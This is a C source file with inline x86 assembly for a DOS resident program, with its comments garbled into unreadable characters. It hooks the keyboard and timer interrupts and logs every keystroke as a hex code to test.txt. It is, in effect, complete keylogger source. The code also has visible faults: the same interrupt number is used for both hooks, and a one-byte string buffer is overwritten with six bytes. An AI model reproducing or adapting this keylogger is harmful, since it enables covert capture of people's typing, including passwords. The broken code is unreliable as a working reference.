#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dos.h>

#define INTR 9
#ifdef __cplusplus
    #define __CPPARGS ...
#else
    #define __CPPARGS
#endif

void interrupt ( *Old_9h)(__CPPARGS);  //���� ��ࠡ��稨� ����������
void interrupt ( *Old_8h)(__CPPARGS);  //���� ��ࠡ��稨� ⠩���
unsigned long int in_dos;

unsigned int Last_Key[256];
unsigned int Curr_Key;
unsigned int Curr_Key_for8;
unsigned int Curr_Key_for9;
unsigned char NotWrited=0;

char filename[] = "test.txt";
unsigned int handle;
char addstr[] = "";
unsigned int len_this;

void addtofile()
{
//************* ����� � DOS �㭪�ﬨ *********************
Curr_Key=Curr_Key_for8;

if (Curr_Key == 0x1000)
   {
   setvect(INTR, Old_9h);          //Alt-Q ��室
   setvect(INTR, Old_8h);
   exit(0);		//��室�� �ࠧ� �� Nortona. �� 㤮���.
   }

addstr[0]=(char)(Curr_Key/(256*16));
addstr[1]=(char)((Curr_Key - addstr[0]*256*16)/256);
addstr[2]=(char)((Curr_Key - addstr[0]*256*16-addstr[1]*256)/16);
addstr[3]=(char)Curr_Key - addstr[0]*256*16-addstr[1]*256-addstr[2]*16;
addstr[4]=' ';
addstr[5]=0;
for (int i=0; i<4; i++)
    {
    if (addstr[i] > 9)
       addstr[i] += 55;
    else addstr[i] += 48;
    }
//   len_this=strlen(addstr);

/*asm mov AH, 0x51           //���࠭塞 ���� PSP
asm int 0x21
asm push BX
asm mov AH, 0x50           //����ࠨ���� PSP �� ��� ᥣ����
asm mov BX, CS
asm int 0x21*/

asm mov AH, 0x3D                  //���뢠��, �����뢠�� � ����뢠�� 䠩�.
asm mov AL, 1
asm mov DX, offset filename
asm int 0x21
asm mov handle, AX

asm mov AH, 0x42
asm mov AL, 2
asm mov BX, handle
asm mov CX, 0
asm mov DX, 0
asm int 0x21

/*asm mov AH, 0x40
asm mov BX, handle
asm mov CX, 1
asm mov DX, offset little
asm int 0x21*/

asm mov AH, 0x40
asm mov BX, handle
asm mov CX, 5              //len_this
asm mov DX, offset addstr
asm int 0x21

asm mov AH, 0x3E
asm mov BX, handle
asm int 0x21

/*asm pop BX
asm mov AH, 50
asm int 0x21*/

NotWriteThis:
return;
}

void interrupt New_8h(__CPPARGS)
{
Old_8h();

asm mov AX, 0xB800          //�������� ࠡ���
asm mov ES, AX
asm mov AX, word ptr DS:NotWrited
asm mov ES:[0x00], AX

if (NotWrited)
   {
   if (peekb((unsigned int)(in_dos/65536), in_dos-((unsigned int)(in_dos/65536))*65536)==0)
      {                             //DOS ᢮�����? �� - ��襬.
      Curr_Key_for8=Last_Key[NotWrited];
      addtofile();
      NotWrited--;
      }
   }
}

void interrupt New_9h(__CPPARGS)
{
Old_9h();

asm mov AX, 0xB800          //�������� ࠡ���
asm mov ES, AX
asm mov AX, word ptr DS:NotWrited
asm mov ES:[0x02], AX

asm mov AX, 0x0040          //���᫠�� � AX ��᫥���� ᨬ��� �� ����
asm mov ES, AX
asm mov BX, ES:0x1A
asm mov AX, ES:[BX]

Curr_Key_for9=_AX;

/*if (peekb(in_dos-((unsigned int)(in_dos/256))*256, (unsigned int)(in_dos/256))==0 && NotWrited=0)
   {                                 //DOS ᢮�����?
   addtofile();
   goto ToHome;
   }*/

NotWrited++;                    //��� - ������� ⠩����
if (NotWrited >= 254)              //��� ���� �� ��९�������
   {
   NotWrited=1;
   }

for (int i=NotWrited;i>1;i--)
    {
    Last_Key[i]=Last_Key[i-1];
    }
Last_Key[1]=Curr_Key_for9;
//ToHome:
}

int main()
{
/*asm mov AH, 0x3C
asm mov CX, 0
asm mov AL, 0
asm mov DX, word ptr filename
asm int 0x21
asm mov handle, AX

asm mov AH, 0x3E
asm mov BX, handle
asm int 0x21*/

asm mov AH, 0x34                 //����稬 ���� 䫠�� ������� DOS
asm int 0x21
asm mov word ptr DS:in_dos, BX
asm mov word ptr DS:in_dos+2, ES

Old_8h=getvect(INTR);            //�����塞 8-�� � 9-�� ���뢠��� �� ᢮�
setvect(INTR, New_8h);

Old_9h=getvect(INTR);
setvect(INTR, New_9h);

printf("����� 8 � 9 ���墠祭�.\n");

keep(0, _SS + (_SP/16) - _psp);
return 0;
}

